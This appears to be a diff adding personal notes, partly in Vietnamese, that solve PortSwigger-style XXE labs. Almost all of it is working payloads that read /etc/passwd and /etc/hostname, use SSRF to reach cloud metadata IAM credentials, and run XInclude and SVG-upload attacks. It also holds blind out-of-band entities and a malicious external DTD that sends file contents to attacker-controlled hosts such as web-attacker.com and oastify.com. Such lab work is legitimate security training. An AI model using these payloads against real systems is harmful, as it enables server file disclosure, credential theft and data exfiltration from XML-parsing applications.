@@ -1,0 +1,182 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<stockCheck><productId>&xxe;</productId></stockCheck>
+
+
+Lab: Exploiting XXE using external entities to retrieve files
+
+- Trong phần stockCheck:
+<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
+
+
+- PoC
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<stockCheck>
+    <productId>&xxe;</productId>
+    <storeId>&xxe;</storeId>
+</stockCheck>
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
+
+
+Lab: Exploiting XXE to perform SSRF attacks
+
+- stockCheck
+<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
+
+- Thử với
+
+- PoC
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
+<stockCheck>
+    <productId>&xxe;</productId>
+    <storeId>&xxe;</storeId>
+</stockCheck>
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+XInclude attacks
+
+<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+  <xi:include parse="text" href="file:///etc/passwd"/>
+</foo>
+
+
+Lab: Exploiting XInclude to retrieve files
+
+- PoC
+
+productId=<foo+xmlns%3axi%3d"http%3a//www.w3.org/2001/XInclude"><xi%3ainclude+parse%3d"text"+href%3d"file%3a///etc/passwd"/></foo>&storeId=1
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Lab: Exploiting XXE via image file upload
+
+- PoC
+
+Content-Disposition: form-data; name="avatar"; filename="payload.svg"
+Content-Type: image/svg+xml
+
+<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Lab: Blind XXE with out-of-band interaction
+
+- PoC
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://twtanklfln7f90u3t60so7xcs3yumnac.oastify.com/"> ]>
+<stockCheck>
+    <productId>&xxe;</productId>
+    <storeId>1</storeId>
+</stockCheck>
+
+
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Lab: Blind XXE with out-of-band interaction via XML parameter entities
+
+- PoC
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://qb572h0c0kmcox9083fp34c970dr1lpa.oastify.com/"> %xxe; ]>
+<stockCheck>
+    <productId>%xxe;</productId>
+    <storeId>%xxe;</storeId>
+</stockCheck>
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Malicius DTD file
+
+
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
+%eval;
+%exfiltrate;
+
+http://web-attacker.com/malicious.dtd
+
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
+"http://web-attacker.com/malicious.dtd"> %xxe;]>
+
+Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD
+
+
+- PoC
+
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://x20etorjrrdjf407za6wub3gy74ystgi.oastify.com/?x=%file;'>">
+%eval;
+%exfiltrate;
+
+URL: https://exploit-0ada00920494553e80ec668301f80032.exploit-server.net/malicious.dtd
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "https://exploit-0ada00920494553e80ec668301f80032.exploit-server.net/malicious.dtd"> %xxe; ]>
+<stockCheck>
+    <productId>%xxe;</productId>
+    <storeId>%xxe;</storeId>
+</stockCheck>
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+%eval;
+%error;
+
+Lab: Exploiting blind XXE to retrieve data via error messages
+
+- PoC
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "https://exploit-0a6900bf03111b8981af0b48014300d5.exploit-server.net/exploit"> %xxe; ]>
+<stockCheck>
+    <productId>%xxe;</productId>
+    <storeId>%xxe;</storeId>
+</stockCheck>
+
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+<!DOCTYPE foo [
+<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
+<!ENTITY % custom_entity '
+<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+&#x25;eval;
+&#x25;error;
+'>
+%local_dtd;
+]>
+
+<!DOCTYPE foo [
+<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+%local_dtd;
+]>
+
+
+Lab: Exploiting XXE to retrieve data by repurposing a local DTD
+
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE message [
+<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+<!ENTITY % ISOamso '
+<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+&#x25;eval;
+&#x25;error;
+'>
+%local_dtd;
+]>
+<stockCheck>
+  <productId>&local_dtd;</productId>
+  <storeId>1</storeId>
+</stockCheck>
+
